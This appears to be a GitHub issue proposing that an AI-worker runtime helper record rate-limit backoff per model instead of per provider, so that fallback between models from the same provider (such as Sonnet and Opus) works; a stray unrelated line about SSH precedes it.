SSH is pre-installed on virtually all Unix systems. If it's genuinely missing, the user has bigger problems.

title: feat: model-level backoff and fallback instead of provider-level
body:
## Problem

`headless-runtime-helper.sh` records backoff at the **provider** level (`provider_backoff` table keys on provider name). When `anthropic/claude-sonnet-4-6` hits a rate limit, the entire `anthropic` provider is backed off — including `anthropic/claude-opus-4-6` which has its own separate rate limit.

This means adding multiple models from the same provider (e.g. sonnet + opus) as fallbacks doesn't work. The second model is skipped because `provider_backoff_active("anthropic")` returns true for all anthropic models.

## Current behaviour

```
AIDEVOPS_HEADLESS_MODELS="anthropic/claude-sonnet-4-6,anthropic/claude-opus-4-6"
```

1. Sonnet gets 429 → backoff recorded for `anthropic` (15 min)
2. Next `choose_model()` → opus skipped because `anthropic` is backed off
3. No models available → worker fails

## Expected behaviour

1. Sonnet gets 429 → backoff recorded for `anthropic/claude-sonnet-4-6`
2. Next `choose_model()` → sonnet skipped, opus checked separately → opus selected
3. Worker runs on opus

## Proposed fix

- Change `provider_backoff` table key from `provider` to `model` (full `provider/model` string)
- `provider_backoff_active()` checks the specific model, not just the provider
- `classify_failure_reason()` and `record_provider_backoff()` pass the full model identifier
- Auth errors can still backoff at provider level (auth is shared), but rate limits should be per-model

## Impact

Users with multiple models from the same provider get no fallback benefit today. This affects anyone using `sonnet + opus`, `sonnet + haiku`, or multiple OpenAI models.
